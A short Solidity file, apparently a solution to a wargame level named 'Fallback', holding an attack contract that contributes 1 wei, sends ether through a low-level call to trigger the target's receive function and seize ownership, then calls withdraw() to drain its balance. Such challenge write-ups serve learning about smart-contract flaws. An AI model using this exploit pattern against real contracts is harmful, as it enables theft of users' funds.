// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface Fallback {
    function contribute() external payable;

    function withdraw() external;
}

// POC: If you look carefully at the function fallback recieve function, it is our key to gain the ownership.
// To get the ownership, contributions[msg.sender] > 0
// In order to have some contributions, we need to contribute() first.
contract Hack {
    Fallback constant lvl01 =
        Fallback(0x605AF36FA62353f714cB9eE628474956d661cF3C);

    // help us to send some ETH to this contract while deploying
    constructor() public payable {}

    function hack() public {
        // We will start with contributing some ETH to contract
        lvl01.contribute{value: 1 wei}();
        // Now we will send some ETH to contract using low level call
        (bool suc, ) = address(lvl01).call{value: 1 wei}("");
        require(suc, "failed");
        // lastly we will withdraw the funds
        lvl01.withdraw();
    }
}
